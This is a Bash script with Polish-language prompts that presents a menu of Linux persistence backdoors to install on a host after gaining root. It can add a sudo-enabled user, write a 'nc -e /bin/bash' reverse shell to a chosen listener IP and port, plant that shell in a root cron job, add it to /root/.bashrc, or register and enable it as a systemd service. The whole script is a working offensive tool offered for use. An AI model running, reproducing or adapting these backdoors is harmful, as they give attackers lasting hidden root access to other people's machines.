#!/bin/bash

opcja="1"
delay_time=2
userid=$(id -u)
listener_ip=" "
listener_port=" "
username=" "
machine_ip=$(hostname -I)

#[tutaj deklaracja funkcji]

function new_user() {
	read -p "Podaj nazwe uzytkownika: " username
	adduser $username
	adduser $username sudo
	echo "Backdoor gotowy, jezeli maszyna ma otwarty ssh uzyj 'ssh "$username"@"$machine_ip"' aby uzyskac polaczenie!"
        read -p "Wcisnij enter zeby powrocic do menu. " opcja
        sleep $delay_time
}

function cronjob_backdoor() {
	read -p "Podaj ip listenera: " listener_ip
        read -p "Podaj port listenera: " listener_port
        echo "Podane ip:port - "$listener_ip":"$listener_port
	echo "nc -e /bin/bash "$listener_ip" "$listener_port >> /root/.backdoor
	chmod +x /root/.backdoor
	echo "1 * * * * root /root/.backdoor" >> /etc/cron.d/cronjobbackdoor
	echo "Backdoor gotowy, teraz uzyj 'nc -nvlp "$listener_port"' na podanym adresie ip i zaczekaj az uzyskasz polaczenie (max. 2 min)"
 	read -p "Wcisnij enter zeby powrocic do menu. " opcja
	sleep $delay_time
}

function bashrc_backdoor() {
	read -p "Podaj ip listenera: " listener_ip
        read -p "Podaj port listenera: " listener_port
	echo "Podane ip:port - "$listener_ip":"$listener_port
	echo "nc -e /bin/bash "$listener_ip" "$listener_port" 2>/dev/null &" >> /root/.bashrc
	echo "Backdoor gotowy, teraz uzyj 'nc -nvlp "$listener_port"' na podanym adresie ip i zaczekaj az uzytkownik root sie zaloguje aby uzyskac polaczenie!"
	read -p "Wcisnij enter zeby powrocic do menu. " opcja
	sleep $delay_time
}

function service_backdoor() {
	read -p "Podaj ip listenera: " listener_ip
        read -p "Podaj port listenera: " listener_port
        echo "Podane ip:port - "$listener_ip":"$listener_port
	echo "[Unit]" > /etc/systemd/system/backdoor.service
	echo "Description=Service backdoor." >> /etc/systemd/system/backdoor.service
	echo " " >> /etc/systemd/system/backdoor.service
	echo "[Service]" >> /etc/systemd/system/backdoor.service
	echo "Type=simple" >> /etc/systemd/system/backdoor.service
	echo "ExecStart=/usr/bin/nc -e /bin/bash "$listener_ip" "$listener_port" 2>/dev/null" >> /etc/systemd/system/backdoor.service
	echo " " >> /etc/systemd/system/backdoor.service
	echo "[Install]" >> /etc/systemd/system/backdoor.service
	echo "WantedBy=multi-user.target" >> /etc/systemd/system/backdoor.service
	systemctl enable backdoor
	echo "Backdoor gotowy, teraz uzyj 'nc -nvlp "$listener_port"' na podanym adresie ip i zaczekaj, w momencie restartu celu uzyskasz polaczenie."
        read -p "Wcisnij enter zeby powrocic do menu. " opcja
        sleep $delay_time
} 

#[tutaj główna pętla skryptu]

echo "Ten skrypt musi byc uruchomiony z uprawnieniami root'a"
echo "Sprawdzanie uprawnien..."
sleep $delay_time

if ($userid !=  0) then
	echo "Nie masz odpowiednich uprawnien!"
	sleep $delay_time
	exit 1;
fi

until [ "$opcja" -eq "0" ]; do
clear
echo "
*****************************************
* 1 - Stworz nowego uzytkownika         *
* 2 - Stworz cronjob backdoor           *
* 3 - Stworz .bashrc backdoor           *
* 4 - Stworz service backdoor		*
* 0 - Opuszczenie skryptu               *
*****************************************
"
read -p "Wybierz opcje [1,2,3,4,5,6 lub 0] > " opcja
    case "$opcja" in
	"0") exit 1;;
        "1") new_user ;;
        "2") cronjob_backdoor;;
        "3") bashrc_backdoor;; 
	"4") service_backdoor;;
         *) Nie wybrano opcji
    esac
sleep $delay_time
done